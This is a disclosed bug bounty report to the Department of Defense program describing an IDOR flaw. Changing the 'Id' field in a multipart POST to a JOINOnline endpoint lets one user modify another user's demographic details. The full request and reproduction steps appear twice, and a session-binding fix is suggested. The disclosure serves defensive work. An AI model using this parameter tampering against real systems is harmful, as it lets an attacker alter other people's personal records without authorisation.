# IDOR : Modify other users demographic details

## Report Details
- **Report ID**: 2586662
- **URL**: https://hackerone.com/reports/2586662
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2024-07-04T18:22:32.154Z
- **Disclosed**: 2024-07-19T15:05:05.164Z

## Reporter
- **Username**: prakhar0x01
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
Hii Triager,

Through researching on the DoD, I discovered an IDOR Vulnerability that allows a malicious user to modify other user's demographic details.

Vulnerable domain : `www.█████████`

### Vulnerable Endpoint-
`/JOINOnline/Board/SubmitDoc`

For testing, I created two accounts with `user-id:` `1328` & `1327`, you can test with them.

### Required 2 test Accounts:
User-A
User-B

## Steps to Reproduce
1 - Login as User-A & User-B, Fill in the required details at: `https://www.█████/JOINOnline/Board/BoardIntro/1021/<ID>/False`
2 - Now, from the User-A account navigate to `Biographical-Info`, Update any information, and Intercept the Request.

```
POST /JOINOnline/Board/SubmitDoc HTTP/1.1
Host: www.█████████
Cookie: {YOUR-COOKIES}
...snip...
Connection: close

------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="UserId"

268
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="Id"

1328
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="BoardId"

1021
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2800"

Test
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2801"

Test
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2802"

Test
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2803"

Test
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2804"

12/12/2001
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2805"

167
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2806"

80
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2807"

Male
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="__RequestVerificationToken"

{VERIFICATION-TOKEN}
------WebKitFormBoundaryrQSrSuOi1l18BB2E--
```

3 -  Change the `Id` parameter value, for eg. in this case you can change `1328` to `1327`(User-B numeric-id)
4 - You can successfully able to change the `User-B` details

## Proof Of Concept:
████████

## Impact

- IDOR

## System Host(s)
www.███

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1 - Login as User-A & User-B, Fill in the required details at: `https://www.████████/JOINOnline/Board/BoardIntro/1021/<ID>/False`
2 - Now, from the User-A account navigate to `Biographical-Info`, Update any information, and Intercept the Request.

```
POST /JOINOnline/Board/SubmitDoc HTTP/1.1
Host: www.█████
Cookie: {YOUR-COOKIES}
...snip...
Connection: close

------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="UserId"

268
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="Id"

1328
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="BoardId"

1021
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2800"

Test
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2801"

Test
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2802"

Test
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2803"

Test
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2804"

12/12/2001
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2805"

167
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2806"

80
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="que2807"

Male
------WebKitFormBoundaryrQSrSuOi1l18BB2E
Content-Disposition: form-data; name="__RequestVerificationToken"

{VERIFICATION-TOKEN}
------WebKitFormBoundaryrQSrSuOi1l18BB2E--
```

3 -  Change the `Id` parameter value, eg. in this case you can change `1328` to `1327`(User-B numeric-id)
4 - You can successfully able to change the `User-B` details

## Suggested Mitigation/Remediation Actions
- Effectively Tied the `User-Ids` & other `numeric Id` with the user Session.



## Attachments
No attachments
